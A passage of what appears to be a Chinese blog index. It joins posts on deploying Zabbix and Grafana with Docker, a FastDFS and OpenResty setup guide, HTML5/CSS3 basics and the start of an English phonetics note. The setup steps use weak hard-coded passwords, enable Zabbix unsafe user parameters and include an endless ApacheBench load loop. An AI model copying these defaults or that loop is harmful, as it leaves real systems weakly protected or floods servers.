\\ -d mysql:5.7.28 \\ --character-set-server=utf8 --collation-server=utf8_bin 2.zabbix-java-gateway部署 1234docker run --name zabbix-java-gateway -t \\--restart=always \\-v /etc/localtime:/etc/localtime \\-d zabbix/zabbix-java-gateway:latest 3.zabbix-snmptraps部署 1234567docker run --name zabbix-snmptraps -t \\-v /zbx_instance/snmptraps:/var/lib/zabbix/snmptraps:rw \\-v /var/lib/zabbix/mibs:/usr/share/snmp/mibs:ro \\--restart=always \\-v /etc/localtime:/etc/localtime \\-p 162:162/udp \\-d zabbix/zabbix-snmptraps:latest 4.zabbix-server-mysql部署 12345678910111213141516docker run --name zabbix-server-mysql -t \\-e DB_SERVER_HOST=&quot;mysql&quot; \\-e MYSQL_DATABASE=&quot;zabbix&quot; \\-e MYSQL_USER=&quot;zabbix&quot; \\-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \\-e MYSQL_ROOT_PASSWORD=&quot;root_Password@&quot; \\-e ZBX_JAVAGATEWAY=&quot;zabbix-java-gateway&quot; \\-e PHP_TZ=&quot;Asia/Shanghai&quot; \\--restart=always \\-v /etc/localtime:/etc/localtime \\--volumes-from zabbix-snmptraps \\--link mysql:mysql \\--link zabbix-java-gateway:zabbix-java-gateway \\-p 10051:10051 \\-d zabbix/zabbix-server-mysql:latest 5.zabbix-web-nginx-mysql部署 1234567891011121314docker run --name zabbix-web-nginx-mysql -t \\--restart=always \\-v /etc/localtime:/etc/localtime \\-e DB_SERVER_HOST=&quot;mysql&quot; \\-e MYSQL_DATABASE=&quot;zabbix&quot; \\-e MYSQL_USER=&quot;zabbix&quot; \\-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \\-e MYSQL_ROOT_PASSWORD=&quot;root_Password@&quot; \\-e PHP_TZ=&quot;Asia/Shanghai&quot; \\--link mysql:mysql \\--link zabbix-server-mysql:zabbix-server \\-p 8080:8080 \\-d zabbix/zabbix-web-nginx-mysql:latest 现在应该可以直接访问http://192.168.224.11:8080/ 默认用户名Admin 密码zabbix 有时候点击小人会出错 以下报错这样解决 1234[root@localhost ~]# docker exec -it zabbix-web-nginx-mysql bash bash-5.0# apk add php7-fileinfobash-5.0# exit[root@localhost ~]# docker restart zabbix-web-nginx-mysql 重新访问就好了 调成中文 6.grafana部署 12345678910docker run --name grafana -t \\--hostname grafana \\--restart=always \\-v /etc/localtime:/etc/localtime \\-e &quot;GF_SERVER_ROOT_URL=http://grafana.server.name&quot; \\-e &quot;GF_SECURITY_ADMIN_PASSWORD=123456&quot; \\-e &quot;GF_INSTALL_PLUGINS=alexanderzobnin-zabbix-app,raintank-worldping-app,grafana-piechart-panel,grafana-clock-panel,farski-blendstat-panel&quot; \\-v /data/grafana:/var/lib/grafana \\-p 3000:3000 \\-d grafana/grafana 如果容器没有启动就看下是什么问题，有时候是权限不到会启动不了 docker logs -f gragana 看日志 此时 3000端口可以正常打开grafana 用户admin 密码 123456 不设置密码，默认密码就是admin vm2装好zabbix-agent 12345678910111213141516 yum install -y wget &amp;&amp; wget http://repo.zabbix.com/zabbix/4.4/rhel/7/x86_64/zabbix-release-4.4-1.el7.noarch.rpm rpm -ivh zabbix-release-4.4-1.el7.noarch.rpm yum install -y epel-release[root@localhost yum.repos.d]# yum -y install zabbix-agent nginxvim /etc/nginx/nginx.conf 在server端相应位置增加 location /status { stub_status on; access_log off; }[root@localhost ~]# nginx -t 使用sed 来修改zabbix-agentd.conf 文件 1234567891011sed -i 's/Server=127.0.0.1/Server=192.168.224.11/g' /etc/zabbix/zabbix_agentd.confsed -i 's/ServerActive=127.0.0.1/ServerActive=192.168.224.11/g' /etc/zabbix/zabbix_agentd.confsed -i 's/Hostname=Zabbix server/Hostname='server2.com' ----- '192.168.224.12'/g' /etc/zabbix/zabbix_agentd.confsed -i 's/# ListenPort=10050/ListenPort=10050/g' /etc/zabbix/zabbix_agentd.confsed -i 's/# HostMetadataItem=/HostMetadataItem=system.uname/g' /etc/zabbix/zabbix_agentd.confsed -i 's/# StartAgents=3/StartAgents=3/g' /etc/zabbix/zabbix_agentd.confsed -i 's/# Timeout=3/Timeout=10/g' /etc/zabbix/zabbix_agentd.confsed -i 's/# UnsafeUserParameters=0/UnsafeUserParameters=1/g' /etc/zabbix/zabbix_agentd.conf 自定义监控nginx链接 123vim /etc/zabbix/zabbix_agentd.conf UserParameter=Nginx.connect,/usr/bin/curl -s 192.168.224.12/status |grep '^Active connections' |awk '{print $NF}' systemctl restart zabbix-agent.service docker exec -it zabbix-server-mysql bash zabbix_get -s 192.168.224.12 -k “Nginx.connect” -p 10050 –使用此命令可以得到被监控端的结果，则测试ok 以下操作在vm1的zabbix web页面 在这里要等ZBX由灰色变成绿色 ，如果没变绿，看下是不是localtime监控项没有启用 创建应用集 创建监控项 配置数据源 安装zabbix插件 1234[root@server1 grafana]# docker exec -it grafana bashbash-5.0$ grafana-cli plugins install alexanderzobnin-zabbix-app[root@localhost ~]# docker restart grafana 启用zabbix插件 添加zabbix数据源 1http://192.168.224.11:8080/api_jsonrpc.php 启用警报 123Vm2安装 yum -y install httpd-toolsvm2运行伪造并发[root@localhost ~]# while true ;do ab -c 1000 -n 10000 http://192.168.224.12/status ;done 创建新的仪表盘，里面可以添加很多监控的项目 填好 后点击右上角的保存按钮，然后命名，就保存了 增加一个ssh是否在线 后续可以安装其他插件， 增加多个仪表盘后，可以再新增一个仪表盘，把改为转换为行(Convert to row ) 就把多个仪表盘合成一行了，方便管理 最后的页面布局样板 12345678docker exec -it grafana bashgrafana-cli plugins install raintank-worldping-app #安装worldping插件grafana-cli plugins install grafana-piechart-panel #安装Pie Chart面板插件grafana-cli plugins install grafana-clock-panel #安装clock面板插件grafana-cli plugins install farski-blendstat-panel #安装Blendstat面板插件docker restart grafana 二，新增配置客户端服务器的tcp状态，1，编辑规则 12345vim /etc/zabbix/zabbix_agentd.d/tcp_status.conf#!/bin/bashUserParameter=TCP_STATUS[*],netstat -ant | grep -c $1重启zabbix-agent 2，然后去zabbix-web端创建模板 3，接着创建应用集和监控项，监控项需要创建12个 12个监控项键值分别是 12TCP_STATUS[CLOSE] TCP_STATUS[CLOSE_WAIT] TCP_STATUS[CLOSING] TCP_STATUS[ESTABLISHED] TCP_STATUS[FIN_WAIT1] TCP_STATUS[FIN_WAIT2] TCP_STATUS[LAST_ACK] TCP_STATUS[LISTEN] TCP_STATUS[SYN_RECV]TCP_STATUS[SYN_SENT] TCP_STATUS[TIME_WAIT] TCP_STATUS[UNKNOWN] 4，接着把新建的模板链接到其他模板， 5，去grafana新建仪表盘，应用集的名称可以不用填写 新增监控nginx状态1,创建脚本 12345678910111213141516171819202122232425mkdir /scriptvim /script/nginx_status.sh#!/bin/bashcase $1 inping) /usr/sbin/pidof nginx |wc -l ;;active) curl -s http://127.0.0.1/nginx_status | awk '/Active/ {print $3}' ;;accepts) curl -s http://127.0.0.1/nginx_status | awk 'NR==3 {print $1}' ;;handled) curl -s http://127.0.0.1/nginx_status | awk 'NR==3 {print $2}' ;;requests) curl -s http://127.0.0.1/nginx_status | awk 'NR==3 {print $3}' ;;reading) curl -s http://127.0.0.1/nginx_status | awk '/Reading/ {print $2}' ;;writing) curl -s http://127.0.0.1/nginx_status | awk '/Writing/ {print $4}' ;;waiting) curl -s http://127.0.0.1/nginx_status | awk '/Waiting/ {print $6}' ;;*) echo \\&quot;Usage: $0 { ping | active | accepts | handled | requests | reading | writing | waiting }\\&quot; ;;esac 2，创建监控项 1234567891011vim /etc/zabbix/zabbix_agentd.d/nginx_status.conf## Nginx_statusUserParameter=nginx.ping,/script/nginx_status.sh pingUserParameter=nginx.active,/script/nginx_status.sh activeUserParameter=nginx.accepts,/script/nginx_status.sh acceptsUserParameter=nginx.handled,/script/nginx_status.sh handledUserParameter=nginx.requests,/script/nginx_status.sh requestsUserParameter=nginx.reading,/script/nginx_status.sh readingUserParameter=nginx.writing,/script/nginx_status.sh writingUserParameter=nginx.waiting,/script/nginx_status.sh waiting 重启zabbix-agent 后面的操作和之前一样 三，grafana面板设置设置变量 group变量设置 host变量设置 **netif变量设置 ** disk变量设置","link":"/2020/08/04/Docker%E9%83%A8%E7%BD%B2Zabbix+Grafana/"},{"title":"FastdFS","text":"fastdFS介绍FastDFS开源地址 12https://github.com/happyfish100https://github.com/happyfish100/fastdfs/wiki 同类的go-fastdfs开源地址 1https://sjqzhang.github.io/go-fastdfs/#what 封装的FastDFS Java API： 1https://github.com/bojiangzhou/lyyzoo-fastdfs-java 1、简介 FastDFS 是一个开源的高性能分布式文件系统（DFS）。 它的主要功能包括：文件存储，文件同步和文件访问，以及高容量和负载平衡。主要解决了海量数据存储问题，特别适合以中小文件（建议范围：4KB &lt; file_size &lt;500MB）为载体的在线服务。 FastDFS 系统有三个角色：跟踪服务器(Tracker Server)、存储服务器(Storage Server)和客户端(Client)。 Tracker Server：跟踪服务器，主要做调度工作，起到均衡的作用；负责管理所有的 storage server和 group，每个 storage 在启动后会连接 Tracker，告知自己所属 group 等信息，并保持周期性心跳。 Storage Server：存储服务器，主要提供容量和备份服务；以 group 为单位，每个 group 内可以有多台 storage server，数据互为备份。 Client：客户端，上传下载数据的服务器，也就是我们自己的项目所部署在的服务器。 2、FastDFS的存储策略 为了支持大容量，存储节点（服务器）采用了分卷（或分组）的组织方式。存储系统由一个或多个卷组成，卷与卷之间的文件是相互独立的，所有卷的文件容量累加就是整个存储系统中的文件容量。一个卷可以由一台或多台存储服务器组成，一个卷下的存储服务器中的文件都是相同的，卷中的多台存储服务器起到了冗余备份和负载均衡的作用。 在卷中增加服务器时，同步已有的文件由系统自动完成，同步完成后，系统自动将新增服务器切换到线上提供服务。当存储空间不足或即将耗尽时，可以动态添加卷。只需要增加一台或多台服务器，并将它们配置为一个新的卷，这样就扩大了存储系统的容量。 3、FastDFS的上传过程 FastDFS向使用者提供基本文件访问接口，比如upload、download、append、delete等，以客户端库的方式提供给用户使用。 Storage Server会定期的向Tracker Server发送自己的存储信息。当Tracker Server Cluster中的Tracker Server不止一个时，各个Tracker之间的关系是对等的，所以客户端上传时可以选择任意一个Tracker。 当Tracker收到客户端上传文件的请求时，会为该文件分配一个可以存储文件的group，当选定了group后就要决定给客户端分配group中的哪一个storage server。当分配好storage server后，客户端向storage发送写文件请求，storage将会为文件分配一个数据存储目录。然后为文件分配一个fileid，最后根据以上的信息生成文件名存储文件。 4、FastDFS的文件同步 写文件时，客户端将文件写至group内一个storage server即认为写文件成功，storage server写完文件后，会由后台线程将文件同步至同group内其他的storage server。 每个storage写文件后，同时会写一份binlog，binlog里不包含文件数据，只包含文件名等元信息，这份binlog用于后台同步，storage会记录向group内其他storage同步的进度，以便重启后能接上次的进度继续同步；进度以时间戳的方式进行记录，所以最好能保证集群内所有server的时钟保持同步。 storage的同步进度会作为元数据的一部分汇报到tracker上，tracke在选择读storage的时候会以同步进度作为参考。 5、FastDFS的文件下载 客户端uploadfile成功后，会拿到一个storage生成的文件名，接下来客户端根据这个文件名即可访问到该文件。 跟upload file一样，在downloadfile时客户端可以选择任意tracker server。tracker发送download请求给某个tracker，必须带上文件名信息，tracke从文件名中解析出文件的group、大小、创建时间等信息，然后为该请求选择一个storage用来服务读请求。 FastDFS部署 两台服务器在server.com 和server1.com同时运行装机脚本，bushu_openresty.sh 先做一件事，修改hosts，将文件服务器的ip与域名映射(单机TrackerServer环境)，因为后面很多配置里面都需要去配置服务器地址，ip变了，就只需要修改hosts即可。 一、安装依赖1yum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl openssl-devel wget vim -y 二、安装FastDFS12345678910111213141516171819202122232425mkdir /data/fdfs/{storage,client,tracker}/{data,logs} -pmkdir /fdfscd /fdfsgit clone https://github.com/happyfish100/fastdfs#下载安装 libfastcommon#libfastcommon是从 FastDFS 和 FastDHT 中提取出来的公共 C 函数库，基础环境，安装即可git clone https://github.com/happyfish100/libfastcommoncd /fdfs/libfastcommon ./make.sh &amp;&amp; ./make.sh installcd /fdfs/fastdfs./make.sh &amp;&amp; ./make.sh install./setup.sh /etc/fdfs/ #也可以不带后面的/etc/fdfs/默认的就是cp到这个路径。systemctl daemon-reload 1、配置Tracker 编辑配置文件 vim /etc/fdfs/tracker.conf 12base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/trackerreserved_storage_space = 20% # storage保留空间 修改为1% 配置开机自启 systemctl enable fdfs_trackerd 启动trakcer systemctl start fdfs_trackerd 启动成功后会自动创建data、logs两个目录。 1ls /data/fdfs/tracker/data/ 查看tracker日志 tailf /data/fdfs/tracker/logs/trackerd.log 配置openresty 123456789101112131415161718192021222324mkdir /software/站点配置文件/ -pcat &lt;&lt;EOF &gt;/software/站点配置文件/fdfs.confupstream fdfs_group1 { # 修改为对应storage server 47.56.185.141:8888 weight=1 max_fails=2 fail_timeout=30s;}server { listen 80; server_name 47.75.70.29; # 修改为对应值 add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'content-type,token,version,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if (\\$request_method = 'OPTIONS') { return 204; } location /group1/M00 { proxy_next_upstream http_502 http_504 error timeout invalid_header; proxy_pass http://fdfs_group1; expires 30d; }}EOFopenresty -s reload 5.1.配置ssl证书集群版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546upstream fdfs_group1 { server 107.148.217.22:8888 weight=1 max_fails=2 fail_timeout=30s; server 198.2.202.222:8888 weight=1 max_fails=2 fail_timeout=30s;}server { listen 80; server_name ludobe.com www.ludobe.com; return 301 https://$host$request_uri;}server { listen 443 ssl http2; server_name ludobe.com www.ludobe.com; add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'content-type,token,version,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } location /group1/M00 { proxy_next_upstream http_502 http_504 error timeout invalid_header; proxy_pass http://fdfs_group1; expires 30d; } ssl_certificate_key /software/域名证书/ludobe.com/ludobe.com.key; ssl_certificate /software/域名证书/ludobe.com/ludobe.com.nginx.crt;}# 阿里云回源server { listen 88; server_name ludobe.com www.ludobe.com; add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS'; add_header Access-Control-Allow-Headers 'content-type,token,version,DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'; if ($request_method = 'OPTIONS') { return 204; } location /group1/M00 { proxy_next_upstream http_502 http_504 error timeout invalid_header; proxy_pass http://fdfs_group1; expires 30d; }} 配置防火墙 12345iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22122 -j ACCEPTiptables -A INPUT -m state --state NEW -p tcp -m tcp --dport 23000 -j ACCEPTiptables -A INPUT -p tcp -m multiport --sports 22122 -j ACCEPTiptables -A INPUT -p tcp -m multiport --dports 80,8888 -j ACCEPTiptables -A INPUT -p tcp -m multiport --sports 80,8888 -j ACCEPT 2、配置Storage 编辑配置文件 vim /etc/fdfs/storage.conf 主要配置以下几项 12345group_name=group1 # 组名base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/storagestore_path0=/home/yuqing/fastdfs # 存储路径 修改为/data/fdfs/storagetracker_server=192.168.209.121:22122 # tracker地址 修改为对应地址tracker_server=192.168.209.122:22122 # 若单tracker 可注释 编译安装openresty及fastdfs-nginx-module 12345678910111213141516mkdir /usr/local/openresty/nginx/ -p #有就不用创建了git clone https://github.com/happyfish100/fastdfs-nginx-modulewget https://openresty.org/download/openresty-1.17.8.2.tar.gztar xf openresty-1.17.8.2.tar.gzcd openresty-1.17.8.2/./configure --prefix=/usr/local/openresty --with-pcre-jit --with-stream --with-stream_ssl_module --with-stream_ssl_preread_module --with-http_v2_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module --with-http_stub_status_module --with-http_realip_module --with-http_addition_module --with-http_auth_request_module --with-http_secure_link_module --with-http_random_index_module --with-http_gzip_static_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-threads --with-stream --with-stream_ssl_preread_module --with-http_ssl_module --add-module=/fdfs/fastdfs-nginx-module/src/gmake &amp;&amp; gmake installsystemctl restart openresty 配置开机自启 systemctl enable fdfs_storaged 启动storage systemctl start fdfs_storaged 查看storage日志 tailf /data/fdfs/storage/logs/storaged.log 这时候存储目录已经自动创建好了 配置mod_fastdfs.conf cp /fdfs/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs/ vim /etc/fdfs/mod_fastdfs.conf 主要配置以下几项 1234tracker_server=tracker:22122 # tracker地址 修改为对应地址group_name=group1 # 组名url_have_group_name = false # url是否包含组名 修改为truestore_path0=/home/yuqing/fastdfs # storage存储路径 修改为/data/fdfs/storage 配置openresty 1234567891011mkdir /software/站点配置文件/ -pcat &lt;&lt;EOF &gt;/software/站点配置文件/fdfs.confserver { listen 8888; server_name 47.56.185.141; # 此处进行对应修改 location /group1/M00 { ngx_fastdfs_module; }}EOFopenresty -s reload 3、配置clientvim /etc/fdfs/client.conf 主要配置以下几项 123base_path=/home/yuqing/fastdfs # 基础路径 修改为/data/fdfs/clienttracker_server=192.168.209.121:22122 # tracker地址 修改为对应地址tracker_server=192.168.209.122:22122 # 若单tracker 可注释 三、测试1、查看FastDFS集群状态fdfs_monitor /etc/fdfs/client.conf 2、上传文件测试123[root@Tracker ~]$ fdfs_upload_file /etc/fdfs/client.conf /fdfs/fastdfs/README_zh.md group1/M00/00/00/Lzi5jV3hBsGAB4RaAAAGpOD9zYI2054.md 若返回 fid 则上传成功 3、文件访问测试使用浏览器访问http://47.75.70.29/group1/M00/00/00/Lzi5jV3hBsGAB4RaAAAGpOD9zYI2054.md若能正常下载，即集群正常工作。","link":"/2020/08/04/FastdFS%E9%83%A8%E7%BD%B2%E8%AF%A6%E8%A7%A3/"},{"title":"H5和css3基础","text":"一，H5和CSS3基础 1,html5列举常用HTML5结构组合 语义化标签 意义 header 文档的页眉 nav 定义导航链接的部分。 section 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。 article 标签规定独立的自包含内容。 figure 标签规定独立的流内容（图像、图表、照片、代码等等）。 figcaption 用作文档中插图的图像，带有一个标题： aside 标签定义其所处内容之外的内容。aside 的内容应该与附近的内容相关。 footer 文档或节的页脚 当然也可以是下面的结构 其中&lt;section&gt;和&lt;article&gt;最为相似，而且和div标签貌似也有很大相似之处。 但看似相似，并不是真的相似，这些标签是为了布局而生的，自然有它们更精确的语义定位，或者说他们更将强调Html的语义。 但看似相似，并不是真的相似，这些标签是为了布局而生的，自然有它们更精确的语义定位，或者说他们更将强调Html的语义。 DIV 123这个标签一直是我们见得最多、用得最多的标签。它本身无任何语义，用作布局以及样式化标签。 Section 123与div相似，但它有更进一步的语义。section用作一段有专题性的内容，一般在它里面会带有标题。 section典型的应用场景应该是文章的章节、标签对话框中的标签页、或者论文中有编号的部分。 Article 1234567article是一个特殊的section标签，它比section具有更明确的语义, 它代表一个独立的、完整的相关内容块。div、section、article，语义是从无到有，逐渐增强的。div无任何语义，仅仅用作样式化或者脚本化的标签，对于一段主题性的内容，则就适用section，而假如这段内容可以脱离上下文，作为完整的独立存在的一段内容，则就适用 article。原则上来说，能使用article的时候，也是可以使用section的，但是实际上，假如使用article更合适，那么就不要使用section。 标签 描述 datalist &lt;input&gt;标签定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。 keygen &lt;keygen&gt; 标签规定用于表单的密钥对生成器字段。 output &lt;output&gt; 标签定义不同类型的输出，比如脚本的输出。 新的 form 属性： autocomplete novalidate 新的 input 属性： autocomplete 自动填充内容 注意 form 的 autocomplete 属性为 “on”（开），但是 e-mail 自动为“off”（关）。 autofocus 自动获取焦点 form form overrides (formaction, formenctype, formmethod, formnovalidate, formtarget) height 和 width list min, max 和 step multiple 多选 pattern (regexp) 给输入框指定正则表达式 placeholder 输入框默认显示的内容 required 必须输入后才能提交 HTML5 添加了很多语义元素如下所示： 标签 描述 &lt;article&gt; 定义页面独立的内容区域。 &lt;aside&gt; 定义页面的侧边栏内容。 &lt;bdi&gt; 允许您设置一段文本，使其脱离其父元素的文本方向设置。 &lt;command&gt; 定义命令按钮，比如单选按钮、复选框或按钮 &lt;details&gt; 用于描述文档或文档某个部分的细节 &lt;dialog&gt; 定义对话框，比如提示框 &lt;summary&gt; 标签包含 details 元素的标题 &lt;figure&gt; 规定独立的流内容（图像、图表、照片、代码等等）。 &lt;figcaption&gt; 定义 &lt;figure&gt; 元素的标题 &lt;footer&gt; 定义 section 或 document 的页脚。 &lt;header&gt; 定义了文档的头部区域 &lt;mark&gt; 定义带有记号的文本。 &lt;meter&gt; 定义度量衡。仅用于已知最大和最小值的度量。 &lt;nav&gt; 定义导航链接的部分。 &lt;progress&gt; 定义任何类型的任务的进度。 &lt;ruby&gt; 定义 ruby 注释（中文注音或字符）。 &lt;rt&gt; 定义字符（中文注音或字符）的解释或发音。 &lt;rp&gt; 在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。 &lt;section&gt; 定义文档中的节（section、区段）。 &lt;time&gt; 定义日期或时间。 &lt;wbr&gt; 规定在文本中的何处适合添加换行符。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162 &lt;style type=&quot;text/css&quot;&gt; mark{ background-color: green; color: blue; } &lt;/style&gt; &lt;script src=&quot;js/jquery-3.5.1.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;!-- 结构性标签: &lt;artcle&gt; 文章,&lt;aside&gt;列表,&lt;footer&gt; 页脚,&lt;header&gt;头部, &lt;nav&gt;导航,&lt;section&gt;块 非结构性标签: &lt;audio&gt;音频,&lt;video&gt;视频,&lt;canvas&gt;绘制图形,&lt;command&gt;定义命令按钮,&lt;datalist&gt;, &lt;details&gt;,&lt;figure&gt;,&lt;mark&gt;,&lt;progress&gt;,&lt;source&gt;,&lt;time&gt; --&gt; &lt;input type=&quot;text&quot; list=&quot;data&quot; placeholder=&quot;请选择&quot;/&gt; &lt;datalist id=&quot;data&quot;&gt; &lt;option &gt;good&lt;/option&gt; &lt;option &gt;nice&lt;/option&gt; &lt;option &gt;handsome&lt;/option&gt; &lt;option &gt;cool&lt;/option&gt; &lt;/datalist&gt; &lt;datails&gt; &lt;summary&gt;yichen&lt;/summary&gt; &lt;p&gt;yichen is a good man&lt;/p&gt; &lt;/datails&gt; &lt;p&gt;yichen is a &lt;mark&gt;good&lt;/mark&gt; man&lt;/p&gt; &lt;progress id=&quot;pro&quot; max=&quot;100&quot; value=&quot;20&quot;&gt;&lt;/progress&gt; &lt;!-- form下的所有输入框都将开启自动填充提示 --&gt; &lt;form action=&quot;&quot; method=&quot;&quot; id=&quot;aa&quot; autocomplete=&quot;on&quot; &gt; &lt;input type=&quot;range&quot; max=&quot;100&quot; min=&quot;0&quot; step=&quot;10&quot; value=&quot;10&quot; /&gt; &lt;input type=&quot;date&quot; /&gt; &lt;input type=&quot;week&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;month&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;datetime-local&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;search&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;color&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;number&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;!-- 自动获取焦点 --&gt; &lt;input type=&quot;text&quot; name=&quot;password&quot; autofocus=&quot;autofocus&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;!-- required 属性表示 必须输入后才能提交 --&gt; &lt;input type=&quot;text&quot; placeholder=&quot;请输入性别&quot; required=&quot;required&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;!-- pattern 给输入框指定正则表达式 --&gt; &lt;input type=&quot;tel&quot; pattern=&quot;\\d+&quot; placeholder=&quot;此输入框已限制只能输入数字&quot; id=&quot;&quot; value=&quot;&quot; /&gt; &lt;!-- 表示输入框被禁用 --&gt; &lt;input type=&quot;text&quot; disabled=&quot;disabled&quot; value=&quot;&quot; /&gt; &lt;!-- readonly 表示这是一个只读输入框 --&gt; &lt;input type=&quot;text&quot; readonly=&quot;readonly&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;这是一个只读输入框&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;/form&gt; &lt;!-- form属性表示表单和写在id aa的表单一样 --&gt; &lt;input type=&quot;text&quot; form=&quot;aa&quot; name=&quot;&quot; id=&quot;&quot; value=&quot;&quot; /&gt; 2，h5拖动事件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;div id=&quot;box1&quot; style=&quot;border: 1px solid black ; width: 500px;height: 500px ;&quot;&gt; &lt;!-- dtaggable表示可拖拽 --&gt; &lt;img src=&quot;img/8.jpg&quot; id=&quot;img&quot; draggable=&quot;true&quot; &gt; &lt;/div&gt; &lt;div id=&quot;box2&quot; style=&quot;border: 1px solid black ; width: 500px;height: 500px ;&quot;&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; /* 1,将要拖放的对象元素的draggable属性设为true,这样才能将元素进行拖放 2,拖动什么 onfragstart 和setDate() 3,放到何处 ondragover 4,进行放置 onfrop 和getData() */ window.onload=function(){ //得到拖动的元素 var box1=document.getElementById(&quot;box1&quot;) var box2=document.getElementById(&quot;box2&quot;) var img=document.getElementById(&quot;img&quot;) //获取数据 img.ondragstart =function(e){ var data=e.dataTransfer data.setData(&quot;text/plain&quot;,this.id) //console.log(&quot;获取到了数据&quot;) } //设置目标元素允许接受拖放元素 box2.ondragover= function(e){ e.preventDefault() //console.log(&quot;移动到了box2&quot;) } //取出你拖放的内容 box2.ondrop =function(e){ var data = e.dataTransfer var text = data.getData(&quot;text/plain&quot;,this.id) //插入 e.target.appendChild(document.getElementById(text)) // console.log(&quot;放到了box2&quot;) } box1.ondragover= function(e){ e.preventDefault() } //设置你想拖放的内容 box1.ondrop =function(e){ var data = e.dataTransfer var text = data.getData(&quot;text/plain&quot;,this.id) //插入 e.target.appendChild(document.getElementById(text)) // console.log(&quot;放到了box1&quot;) } } &lt;/script&gt; 2,CSS3新文本属性 属性 描述 CSS hanging-punctuation 规定标点字符是否位于线框之外。 3 punctuation-trim 规定是否对标点字符进行修剪。 3 text-align-last 设置如何对齐最后一行或紧挨着强制换行符之前的行。 3 text-emphasis 向元素的文本应用重点标记以及重点标记的前景色。 3 text-justify 规定当 text-align 设置为 “justify” 时所使用的对齐方法。 3 text-outline 规定文本的轮廓。 3 text-overflow 规定当文本溢出包含元素时发生的事情。 3 text-shadow 向文本添加阴影。 3 text-wrap 规定文本的换行规则。 3 word-break 规定非中日韩文本的换行规则。 3 word-wrap 允许对长的不可分割的单词进行分割并换行到下一行。 3 CSS3 弹性盒子属性 下表列出了在弹性盒子中常用到的属性: 属性 描述 display 指定 HTML 元素盒子类型。 flex-direction 指定了弹性容器中子元素的排列方式 justify-content 设置弹性盒子元素在主轴（横轴）方向上的对齐方式。 align-items 设置弹性盒子元素在侧轴（纵轴）方向上的对齐方式。 flex-wrap 设置弹性盒子的子元素超出父容器时是否换行。 align-content 修改 flex-wrap 属性的行为，类似 align-items, 但不是设置子元素对齐，而是设置行对齐 flex-flow flex-direction 和 flex-wrap 的简写 order 设置弹性盒子的子元素排列顺序。 align-self 在弹性子元素上使用。覆盖容器的 align-items 属性。 flex 设置弹性盒子的子元素如何分配空间。 CSS3的动画属性 下面的表格列出了 @keyframes 规则和所有动画属性： 属性 描述 CSS @keyframes 规定动画。 3 animation 所有动画属性的简写属性，除了 animation-play-state 属性。 3 animation-name 规定 @keyframes 动画的名称。 3 animation-duration 规定动画完成一个周期所花费的秒或毫秒。默认是 0。 3 animation-timing-function 规定动画的速度曲线。默认是 “ease”。 3 animation-fill-mode 规定当动画不播放时（当动画完成时，或当动画有一个延迟未开始播放时），要应用到元素的样式。 3 animation-delay 规定动画何时开始。默认是 0。 3 animation-iteration-count 规定动画被播放的次数。默认是 1。 3 animation-direction 规定动画是否在下一周期逆向地播放。默认是 “normal”。 3 animation-play-state 规定动画是否正在运行或暂停。默认是 “running”。 3 3，移动端基础123456789移动端&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0, maximum-scale=1.0,minimum-scale=1.0,user-scalable=no&quot;/&gt;Viewport详解每一个名/值对都是一个给浏览器发布命令的指令，它们被逗号分隔，共5个。1、width: 设置布局视口的宽度为特定的值2、init-scale: 设置页面的初始缩放程度和布局视口的宽度3、minimum-scale:设置最小缩放程度(用户可缩小的程度)4、maxmum-scale: 设置了最大缩放程度(用户可放大的程度)5、user-scalable: 是否阻止用户进行缩放","link":"/2020/08/04/H5%E5%92%8CCSS3%E5%9F%BA%E7%A1%80/"},{"title":"English基础","text":"[toc] 英语基础音标 12345678910111213141516171819元音20 12个单元音 5个长元音 饿: o: 污: 啊: i: ɜː ɔ: u: ɑː 7个短元音 饿 o 污 啊 啊 诶 ɪ ə ɒ u ʌ æ e 8个双元音 A 爱 奥 哦A 欧 一儿 诶儿 污儿 ei aɪ aʊ ɔɪ əʊ ɪə eə ʊə辅音28 清辅音 婆 特 石 